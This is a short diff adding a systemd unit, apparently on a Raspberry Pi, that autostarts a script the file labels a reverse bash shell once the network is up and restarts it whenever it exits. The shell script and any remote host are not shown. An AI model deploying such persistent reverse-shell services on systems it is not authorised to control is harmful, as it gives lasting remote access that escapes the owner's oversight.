@@ -1,0 +1,11 @@
+[Unit]
+Description=Autostart Reverce Bash Shell
+After=network-online.target
+
+[Service]
+Type=idle
+ExecStart=/bin/bash /home/pi/reverce/run.sh &
+Restart=always
+
+[Install]
+WantedBy=network-online.target
